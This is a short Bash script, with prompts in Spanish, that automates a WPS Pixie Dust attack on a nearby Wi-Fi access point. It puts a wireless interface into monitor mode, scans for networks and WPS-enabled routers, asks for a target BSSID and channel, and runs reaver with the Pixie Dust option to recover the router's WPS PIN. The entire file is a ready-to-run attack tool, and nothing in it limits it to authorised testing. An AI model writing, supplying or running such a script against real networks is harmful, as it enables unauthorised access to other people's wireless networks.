#!/bin/bash
if [ "$(id -u)" -ne 0 ]; then
    echo "Este script debe ejecutarse como root." >&2
    exit 1
fi

trap ctrl_c INT

function ctrl_c() {
	echo "    [;,;] Trapped CTRL-C "
	exit 1
}

echo "[+] Interfaces de red disponibles:"
ip link show | grep -E '^[0-9]+: ' | awk -F': ' '{print $2}'
read -p "[+] Introduzca la interfaz de red a utilizar: " INTERFACE
MONITOR_INTERFACE="${INTERFACE}mon"
echo "[+] Poniendo la interfaz $INTERFACE en modo monitor..."
airmon-ng start "$INTERFACE"
echo "[+] Escaneando redes Wi-Fi cercanas. Presiona Ctrl+C para detener."
sudo airodump-ng "$MONITOR_INTERFACE"
read -p "[+] Introduzca el TARGET_BSSID de la red a utilizar: " TARGET_BSSID
read -p "[+] Introduzca el TARGET_CHANNEL de la red a utilizar: " TARGET_CHANNEL
echo "[+] Cambiando el canal de la interfaz a $TARGET_CHANNEL..."
sudo iwconfig "$MONITOR_INTERFACE" channel "$TARGET_CHANNEL"
echo "[+] Escaneando redes WPS..."
wash -i "$MONITOR_INTERFACE"
echo "[+] Redes WPS encontradas:"
echo "[+] Cambiando el canal de la interfaz a $TARGET_CHANNEL..."
sudo iwconfig "$MONITOR_INTERFACE" channel "$TARGET_CHANNEL"
echo "[+] Ejecutando Reaver con Pixie Dust Attack en $TARGET_BSSID..."
reaver -i "$MONITOR_INTERFACE" -b "$TARGET_BSSID" -K -vv
echo "[+] Deteniendo la interfaz en modo monitor..."
airmon-ng stop $MONITOR_INTERFACE
sudo iwconfig
echo "[+] Script completado."
